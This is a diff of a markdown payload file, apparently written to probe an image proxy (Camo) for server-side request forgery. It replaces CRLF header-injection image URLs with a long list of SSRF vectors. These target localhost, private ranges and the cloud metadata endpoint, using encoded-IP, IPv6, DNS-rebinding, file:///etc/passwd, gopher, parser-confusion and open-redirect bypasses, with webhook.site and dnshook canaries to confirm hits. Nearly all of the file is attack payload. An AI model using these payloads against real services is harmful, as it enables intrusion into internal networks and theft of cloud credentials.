@@ -1,43 +1,98 @@
-# SSRF Verification Test - v15
+# SSRF Test v16 - True SSRF Testing
 
-This test verifies whether CRLF injection actually works by checking if the injected X-Injected-Test header appears in the request.
+Focusing on actual SSRF vectors now that header injection is confirmed NOT working.
 
-## Test 1: Baseline (no injection)
-![baseline](https://webhook.site/8af69f3d-bfff-4a34-b04d-96a28e1e0e47/baseline-test.gif)
+## Canary
+![canary](https://webhook.site/c1965320-5632-4d3c-88c6-f4432ddd48ce/v16-canary.gif)
 
-## Test 2: CRLF Header Injection Attempt
-If Camo is vulnerable, the X-Injected-Test header should appear in webhook.site's received headers.
+## 1. Direct Internal IP Testing
+These should be BLOCKED by Camo if SSRF protection works:
 
-![inject1](https://webhook.site/8af69f3d-bfff-4a34-b04d-96a28e1e0e47/x%0d%0aX-Injected-Test:%20VULNERABLE%0d%0a.gif)
+### Localhost variations
+![local1](https://127.0.0.1/test.gif)
+![local2](https://localhost/test.gif)
+![local3](https://127.0.0.1:80/test.gif)
+![local4](https://127.0.0.1:8080/test.gif)
+![local5](https://0.0.0.0/test.gif)
+![local6](https://[::1]/test.gif)
 
-## Test 3: Double URL Encoding
-![inject2](https://webhook.site/8af69f3d-bfff-4a34-b04d-96a28e1e0e47/x%250d%250aX-Double-Encoded:%20TEST%250d%250a.gif)
+### Private IP ranges
+![priv1](https://10.0.0.1/test.gif)
+![priv2](https://192.168.1.1/test.gif)
+![priv3](https://172.16.0.1/test.gif)
 
-## Test 4: Mixed Encoding
-![inject3](https://webhook.site/8af69f3d-bfff-4a34-b04d-96a28e1e0e47/x%0d%0aX-Test-Header:%20value1%250d%250aX-Second:%20value2.gif)
+### AWS Metadata
+![aws1](https://169.254.169.254/latest/meta-data/test.gif)
+![aws2](https://169.254.170.2/test.gif)
 
-## Test 5: Null Byte Injection
-![null1](https://webhook.site/8af69f3d-bfff-4a34-b04d-96a28e1e0e47/x%00X-Null-Header:%20test.gif)
+## 2. Localhost Bypass Attempts
+These are common SSRF filter bypasses:
 
-## Test 6: Tab Character
-![tab1](https://webhook.site/8af69f3d-bfff-4a34-b04d-96a28e1e0e47/x%09X-Tab-Header:%20test.gif)
+### Decimal IP
+![dec1](https://2130706433/test.gif)
 
-## Test 7: Space in Path
-![space1](https://webhook.site/8af69f3d-bfff-4a34-b04d-96a28e1e0e47/x%20HTTP/1.1%0d%0aHost:%20evil.gif)
+### Hex IP
+![hex1](https://0x7f000001/test.gif)
 
-## Test 8: Unicode Line Separator
-![unicode1](https://webhook.site/8af69f3d-bfff-4a34-b04d-96a28e1e0e47/x%E2%80%A8X-Unicode-Line:%20test.gif)
+### Octal IP
+![oct1](https://0177.0.0.1/test.gif)
+![oct2](https://017700000001/test.gif)
 
-## Test 9: Unicode Paragraph Separator  
-![unicode2](https://webhook.site/8af69f3d-bfff-4a34-b04d-96a28e1e0e47/x%E2%80%A9X-Unicode-Para:%20test.gif)
+### Mixed notation
+![mix1](https://127.0.0.1.nip.io/test.gif)
+![mix2](https://127.0.0.1.xip.io/test.gif)
+![mix3](https://127.1/test.gif)
+![mix4](https://127.000.000.001/test.gif)
 
-## Test 10: Form Feed Character
-![ff1](https://webhook.site/8af69f3d-bfff-4a34-b04d-96a28e1e0e47/x%0cX-FF-Header:%20test.gif)
+### IPv6 variations  
+![ipv6_1](https://[0:0:0:0:0:0:0:1]/test.gif)
+![ipv6_2](https://[::ffff:127.0.0.1]/test.gif)
+![ipv6_3](https://[0000::0001]/test.gif)
 
-## Test 11: Vertical Tab
-![vt1](https://webhook.site/8af69f3d-bfff-4a34-b04d-96a28e1e0e47/x%0bX-VT-Header:%20test.gif)
+## 3. DNS Rebinding Setup
+### Use external services that resolve to internal IPs
+![rebind1](https://localtest.me/test.gif)
+![rebind2](https://127.0.0.1.nip.io/test.gif)
+![rebind3](https://spoofed.burpcollaborator.net/test.gif)
 
-## DNS Tests
-![dns1](https://8af69f3d-bfff-4a34-b04d-96a28e1e0e47.dnshook.site/test.gif)
+## 4. Protocol Handlers (if any bypass HTTPS)
+### HTTP (downgrade)
+![http1](http://webhook.site/c1965320-5632-4d3c-88c6-f4432ddd48ce/http-downgrade.gif)
 
-Version 15 - Header Injection Verification
+### File protocol (unlikely but test)
+![file1](file:///etc/passwd)
+![file2](file://localhost/etc/passwd)
+
+### Gopher (unlikely)
+![gopher1](gopher://c1965320-5632-4d3c-88c6-f4432ddd48ce.dnshook.site/test)
+
+### FTP
+![ftp1](ftp://c1965320-5632-4d3c-88c6-f4432ddd48ce.dnshook.site/test)
+
+## 5. URL Parser Confusion
+### @ symbol confusion
+![at1](https://webhook.site@127.0.0.1/test.gif)
+![at2](https://foo@evil.com@127.0.0.1/test.gif)
+
+### Fragment tricks
+![frag1](https://127.0.0.1#@webhook.site/c1965320-5632-4d3c-88c6-f4432ddd48ce/frag.gif)
+
+### Backslash variations
+![slash1](https://webhook.site/c1965320-5632-4d3c-88c6-f4432ddd48ce\@127.0.0.1/test.gif)
+
+## 6. Open Redirect to Internal
+If any external service redirects to internal IPs:
+![redir1](https://httpbin.org/redirect-to?url=http://127.0.0.1/test.gif)
+![redir2](https://httpbin.org/redirect-to?url=http://169.254.169.254/latest/meta-data/)
+
+## 7. DNS that resolves to internal
+### Our webhook with internal DNS
+![dns1](https://localhost.c1965320-5632-4d3c-88c6-f4432ddd48ce.dnshook.site/test.gif)
+![dns2](https://internal.c1965320-5632-4d3c-88c6-f4432ddd48ce.dnshook.site/test.gif)
+![dns3](https://metadata.c1965320-5632-4d3c-88c6-f4432ddd48ce.dnshook.site/test.gif)
+
+## 8. Cloud Metadata Service Bypasses  
+![cloud1](https://[::ffff:169.254.169.254]/latest/meta-data/)
+![cloud2](https://169.254.169.254.xip.io/latest/meta-data/)
+
+Version 16 - True SSRF testing
